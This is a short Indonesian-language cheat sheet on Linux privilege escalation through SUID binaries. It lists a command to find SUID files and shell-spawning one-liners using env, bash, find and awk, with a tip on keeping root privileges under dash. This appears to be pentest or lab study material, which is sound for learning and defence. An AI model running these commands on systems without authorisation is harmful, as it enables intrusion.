# Exploiting SUID

SUID memungkinkan suatu binary dijalankan dengan **effective user ID (euid)**
milik owner file. Jika binary SUID dimiliki `root` dan dapat disalahgunakan,
binary tersebut berpotensi digunakan untuk **privilege escalation**.

## Cari SUID binary

```bash
find / -perm -4000 -type f 2>/dev/null
# Mencari semua file yang memiliki SUID bit
```

## Cek GTFOBins

Untuk tiap binary -> cek [https://gtfobins.github.io](https://gtfobins.github.io) bagian "SUID"

**Keterangan:**  
GTFOBins berisi referensi binary Unix/Linux yang dapat disalahgunakan dalam
kondisi permission tertentu. Fokus pada bagian **SUID** untuk binary yang
ditemukan.

## Pola Umum

```bash
./binary -p ...                              # -p mempertahankan euid
env /bin/sh -p                               # SUID env
bash -p                                      # SUID bash
find . -exec /bin/sh -p \; -quit             # SUID find
awk 'BEGIN{system("/bin/sh")}'               # SUID awk (mawk)
```

**Keterangan singkat:**

```text
-p       → Mempertahankan effective UID saat menjalankan shell
env      → Dapat digunakan untuk menjalankan program lain
bash     → Opsi -p mempertahankan privilege
find     → Memanfaatkan opsi -exec untuk menjalankan command
awk/mawk  → Memanfaatkan fungsi system() untuk menjalankan command
```

## Catatan Penting

Payload via `system()` -> `/bin/sh` (dash) bisa **DROP privilege**.

**Solusi:**

- Gunakan binary yang `execve` langsung (`env`/`find`)
- Atau gunakan `/bin/bash -p`

**Keterangan:**  
Beberapa shell seperti `dash` dapat secara otomatis menurunkan privilege ketika
dijalankan dalam kondisi tertentu. Karena itu, shell yang digunakan perlu
mempertahankan **effective UID** agar privilege SUID tidak hilang.

## Alur

```text
Cari SUID
    ↓
Identifikasi binary
    ↓
Cek GTFOBins → SUID
    ↓
Validasi permission & konfigurasi
    ↓
Uji teknik yang sesuai
    ↓
Verifikasi privilege dengan id
```
